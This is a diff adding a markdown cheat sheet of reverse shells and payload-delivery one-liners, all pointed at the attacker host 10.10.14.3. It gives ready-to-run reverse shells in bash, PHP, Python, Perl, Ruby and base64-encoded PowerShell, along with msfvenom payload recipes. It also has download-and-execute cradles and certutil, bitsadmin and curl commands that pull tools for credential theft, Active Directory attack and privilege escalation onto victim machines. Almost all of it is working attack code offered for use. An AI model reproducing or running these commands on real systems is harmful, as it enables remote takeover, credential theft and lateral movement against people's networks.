@@ -1,0 +1,369 @@
+# Incompetent Bastard
+Excessive handcrafted reverse shells with love and minimal care.
+# Bash TCP
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+0<&888;exec 888<>/dev/tcp/10.10.14.3/443; sh <&888 >&888 2>&888
+/bin/bash -l > /dev/tcp/10.10.14.3/443 0<&1 2>&1
+# UDP nc -u -lnvp ${PORT}\n\n
+bash -i >& /dev/udp/10.10.14.3/443 0>&1
+sh -i >& /dev/udp/10.10.14.3/443 0>&1
+# PHP\n\n
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f");?>
+php -r '$sock=fsockopen("10.10.14.3",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.3",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.3",443);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("10.10.14.3",443);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.3",443);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.3",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+# PYTHON 
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.10.14.3",443));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("10.10.14.3",443));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
+# PERL
+perl -e 'use Socket;$i="10.10.14.3";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.3:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+# RUBY
+ruby -rsocket -e'f=TCPSocket.open("10.10.14.3",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.3","443");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}
+# MSFVENOM
+shell_443.exe :: windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f exe
+shell_443.elf :: linux/x86/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf 
+meterpreter_443.elf :: linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf
+meter64_443.elf :: linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf
+shell_443.macho :: osx/x86/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f macho
+shell_443.asp :: windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f asp
+shell_443.jsp :: java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f raw
+shell_443.war :: java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war
+# MSF handlers command.sh
+Payload windows/x64/meterpreter_https
+./command.sh metasploit msf_https8080
+./command.sh metasploit msf_https
+Payload windows/x64/meterpreter_tcp
+./command.sh metasploit msf_tcp
+Payload generic/shell_reverse_tcp
+./command.sh metasploit msfshell_tcp8080
+./command.sh metasploit msfshell_tcp
+# POWERSHELL
+
+
+## Powershell reverseshell variant 1
+$c = New-Object System.Net.Sockets.TCPClient('10.10.14.3',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();
+
+powershell -exec bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgAzACcALAA0ADQAMwApADsAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7ACQAeQBvAGwAbwAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAeQBvAGwAbwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAeQBvAGwAbwAgACsAIAAnACMAJwApADsAJABzAC4AVwByAGkAdABlACgAJAB5AG8AbABvACwAMAAsACQAeQBvAGwAbwAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApADsA
+
+## Powershell reverseshell variant 2
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + '#'> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+powershell -exec -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMwAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACIALgAgAHsAIAAkAGQAYQB0AGEAIAB9ACAAMgA+ACYAMQAiACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAIwAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA
+
+
+# PowerShell scripts
+## invoke-shellcode.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/payloads/invoke-shellcode.ps1')
+Invoke-WebRequest https://10.10.14.3/payloads/invoke-shellcode.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBwAGEAeQBsAG8AYQBkAHMALwBpAG4AdgBvAGsAZQAtAHMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApAA==
+## PowerView.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/PowerView.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/PowerView.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVgBpAGUAdwAuAHAAcwAxACcAKQA=
+## powercat.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/powercat.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/powercat.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA
+## PrivescCheck.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/PrivescCheck.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/PrivescCheck.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBQAHIAaQB2AGUAcwBjAEMAaABlAGMAawAuAHAAcwAxACcAKQA=
+## SharpHound.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/SharpHound.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/SharpHound.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBTAGgAYQByAHAASABvAHUAbgBkAC4AcABzADEAJwApAA==
+## Invoke-PowerShellTcp.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Invoke-PowerShellTcp.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Invoke-PowerShellTcp.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA
+## Find-PSRemotingLocalAdminAccess.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Find-PSRemotingLocalAdminAccess.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Find-PSRemotingLocalAdminAccess.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBGAGkAbgBkAC0AUABTAFIAZQBtAG8AdABpAG4AZwBMAG8AYwBhAGwAQQBkAG0AaQBuAEEAYwBjAGUAcwBzAC4AcABzADEAJwApAA==
+## Invoke-DomainPasswordSpray.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Invoke-DomainPasswordSpray.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Invoke-DomainPasswordSpray.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBJAG4AdgBvAGsAZQAtAEQAbwBtAGEAaQBuAFAAYQBzAHMAdwBvAHIAZABTAHAAcgBhAHkALgBwAHMAMQAnACkA
+## Invoke-DCsync.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Invoke-DCsync.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Invoke-DCsync.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBJAG4AdgBvAGsAZQAtAEQAQwBzAHkAbgBjAC4AcABzADEAJwApAA==
+## powermad.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/powermad.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/powermad.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBwAG8AdwBlAHIAbQBhAGQALgBwAHMAMQAnACkA
+## Powersql.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Powersql.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Powersql.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAcwBxAGwALgBwAHMAMQAnACkA
+## PowerUp.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/PowerUp.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/PowerUp.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVQBwAC4AcABzADEAJwApAA==
+## Invoke-Portscan.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/tools/Invoke-Portscan.ps1')
+Invoke-WebRequest https://10.10.14.3/tools/Invoke-Portscan.ps1 | Invoke-Expression
+powershell -Version 2 -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwB0AG8AbwBsAHMALwBJAG4AdgBvAGsAZQAtAFAAbwByAHQAcwBjAGEAbgAuAHAAcwAxACcAKQA=
+## lazagne.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/lazagne.exe lazagne.exe
+cmd.exe /c curl http://10.10.14.3/tools/lazagne.exe -o C:\Windows\Tasks\lazagne.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/lazagne.exe c:\\windows\\tasks\lazagne.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\lazagne.exe > c:\windows\\tasks\lazagne.exe
+powershell iwr -uri http://10.10.14.3/tools/lazagne.exe -o c:\windows\\tasks\lazagne.exe
+powershell wget http://10.10.14.3/tools/lazagne.exe -o c:\windows\\tasks\lazagne.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/lazagne.exe','c:\\windows\\tasks\lazagne.exe')./command.sh [screenname] get_lazagne
+## Whisker.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/Whisker.exe Whisker.exe
+cmd.exe /c curl http://10.10.14.3/tools/Whisker.exe -o C:\Windows\Tasks\Whisker.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/Whisker.exe c:\\windows\\tasks\Whisker.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\Whisker.exe > c:\windows\\tasks\Whisker.exe
+powershell iwr -uri http://10.10.14.3/tools/Whisker.exe -o c:\windows\\tasks\Whisker.exe
+powershell wget http://10.10.14.3/tools/Whisker.exe -o c:\windows\\tasks\Whisker.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/Whisker.exe','c:\\windows\\tasks\Whisker.exe')./command.sh [screenname] get_whisker
+## GoldenGMSA.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/GoldenGMSA.exe GoldenGMSA.exe
+cmd.exe /c curl http://10.10.14.3/tools/GoldenGMSA.exe -o C:\Windows\Tasks\GoldenGMSA.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/GoldenGMSA.exe c:\\windows\\tasks\GoldenGMSA.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\GoldenGMSA.exe > c:\windows\\tasks\GoldenGMSA.exe
+powershell iwr -uri http://10.10.14.3/tools/GoldenGMSA.exe -o c:\windows\\tasks\GoldenGMSA.exe
+powershell wget http://10.10.14.3/tools/GoldenGMSA.exe -o c:\windows\\tasks\GoldenGMSA.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/GoldenGMSA.exe','c:\\windows\\tasks\GoldenGMSA.exe')./command.sh [screenname] get_goldengmsa
+## SharpWMI.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SharpWMI.exe SharpWMI.exe
+cmd.exe /c curl http://10.10.14.3/tools/SharpWMI.exe -o C:\Windows\Tasks\SharpWMI.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SharpWMI.exe c:\\windows\\tasks\SharpWMI.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SharpWMI.exe > c:\windows\\tasks\SharpWMI.exe
+powershell iwr -uri http://10.10.14.3/tools/SharpWMI.exe -o c:\windows\\tasks\SharpWMI.exe
+powershell wget http://10.10.14.3/tools/SharpWMI.exe -o c:\windows\\tasks\SharpWMI.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SharpWMI.exe','c:\\windows\\tasks\SharpWMI.exe')./command.sh [screenname] get_sharpwmi
+## rottenpotato.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/rottenpotato.exe rottenpotato.exe
+cmd.exe /c curl http://10.10.14.3/tools/rottenpotato.exe -o C:\Windows\Tasks\rottenpotato.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/rottenpotato.exe c:\\windows\\tasks\rottenpotato.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\rottenpotato.exe > c:\windows\\tasks\rottenpotato.exe
+powershell iwr -uri http://10.10.14.3/tools/rottenpotato.exe -o c:\windows\\tasks\rottenpotato.exe
+powershell wget http://10.10.14.3/tools/rottenpotato.exe -o c:\windows\\tasks\rottenpotato.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/rottenpotato.exe','c:\\windows\\tasks\rottenpotato.exe')./command.sh [screenname] get_rottenpotato
+## nmap-7.94-setup.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/nmap-7.94-setup.exe nmap-7.94-setup.exe
+cmd.exe /c curl http://10.10.14.3/tools/nmap-7.94-setup.exe -o C:\Windows\Tasks\nmap-7.94-setup.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/nmap-7.94-setup.exe c:\\windows\\tasks\nmap-7.94-setup.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\nmap-7.94-setup.exe > c:\windows\\tasks\nmap-7.94-setup.exe
+powershell iwr -uri http://10.10.14.3/tools/nmap-7.94-setup.exe -o c:\windows\\tasks\nmap-7.94-setup.exe
+powershell wget http://10.10.14.3/tools/nmap-7.94-setup.exe -o c:\windows\\tasks\nmap-7.94-setup.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/nmap-7.94-setup.exe','c:\\windows\\tasks\nmap-7.94-setup.exe')./command.sh [screenname] get_nmap-7.94-setup
+## SpoolFool.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SpoolFool.exe SpoolFool.exe
+cmd.exe /c curl http://10.10.14.3/tools/SpoolFool.exe -o C:\Windows\Tasks\SpoolFool.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SpoolFool.exe c:\\windows\\tasks\SpoolFool.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SpoolFool.exe > c:\windows\\tasks\SpoolFool.exe
+powershell iwr -uri http://10.10.14.3/tools/SpoolFool.exe -o c:\windows\\tasks\SpoolFool.exe
+powershell wget http://10.10.14.3/tools/SpoolFool.exe -o c:\windows\\tasks\SpoolFool.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SpoolFool.exe','c:\\windows\\tasks\SpoolFool.exe')./command.sh [screenname] get_spoolfool
+## Certify.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/Certify.exe Certify.exe
+cmd.exe /c curl http://10.10.14.3/tools/Certify.exe -o C:\Windows\Tasks\Certify.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/Certify.exe c:\\windows\\tasks\Certify.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\Certify.exe > c:\windows\\tasks\Certify.exe
+powershell iwr -uri http://10.10.14.3/tools/Certify.exe -o c:\windows\\tasks\Certify.exe
+powershell wget http://10.10.14.3/tools/Certify.exe -o c:\windows\\tasks\Certify.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/Certify.exe','c:\\windows\\tasks\Certify.exe')./command.sh [screenname] get_certify
+## winPEASx64_ofs.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/winPEASx64_ofs.exe winPEASx64_ofs.exe
+cmd.exe /c curl http://10.10.14.3/tools/winPEASx64_ofs.exe -o C:\Windows\Tasks\winPEASx64_ofs.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/winPEASx64_ofs.exe c:\\windows\\tasks\winPEASx64_ofs.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\winPEASx64_ofs.exe > c:\windows\\tasks\winPEASx64_ofs.exe
+powershell iwr -uri http://10.10.14.3/tools/winPEASx64_ofs.exe -o c:\windows\\tasks\winPEASx64_ofs.exe
+powershell wget http://10.10.14.3/tools/winPEASx64_ofs.exe -o c:\windows\\tasks\winPEASx64_ofs.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/winPEASx64_ofs.exe','c:\\windows\\tasks\winPEASx64_ofs.exe')./command.sh [screenname] get_winpeasx64_ofs
+## SafetyKatz.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SafetyKatz.exe SafetyKatz.exe
+cmd.exe /c curl http://10.10.14.3/tools/SafetyKatz.exe -o C:\Windows\Tasks\SafetyKatz.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SafetyKatz.exe c:\\windows\\tasks\SafetyKatz.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SafetyKatz.exe > c:\windows\\tasks\SafetyKatz.exe
+powershell iwr -uri http://10.10.14.3/tools/SafetyKatz.exe -o c:\windows\\tasks\SafetyKatz.exe
+powershell wget http://10.10.14.3/tools/SafetyKatz.exe -o c:\windows\\tasks\SafetyKatz.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SafetyKatz.exe','c:\\windows\\tasks\SafetyKatz.exe')./command.sh [screenname] get_safetykatz
+## MSSQL.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/MSSQL.exe MSSQL.exe
+cmd.exe /c curl http://10.10.14.3/tools/MSSQL.exe -o C:\Windows\Tasks\MSSQL.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/MSSQL.exe c:\\windows\\tasks\MSSQL.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\MSSQL.exe > c:\windows\\tasks\MSSQL.exe
+powershell iwr -uri http://10.10.14.3/tools/MSSQL.exe -o c:\windows\\tasks\MSSQL.exe
+powershell wget http://10.10.14.3/tools/MSSQL.exe -o c:\windows\\tasks\MSSQL.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/MSSQL.exe','c:\\windows\\tasks\MSSQL.exe')./command.sh [screenname] get_mssql
+## PetitPotam.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/PetitPotam.exe PetitPotam.exe
+cmd.exe /c curl http://10.10.14.3/tools/PetitPotam.exe -o C:\Windows\Tasks\PetitPotam.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/PetitPotam.exe c:\\windows\\tasks\PetitPotam.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\PetitPotam.exe > c:\windows\\tasks\PetitPotam.exe
+powershell iwr -uri http://10.10.14.3/tools/PetitPotam.exe -o c:\windows\\tasks\PetitPotam.exe
+powershell wget http://10.10.14.3/tools/PetitPotam.exe -o c:\windows\\tasks\PetitPotam.exe
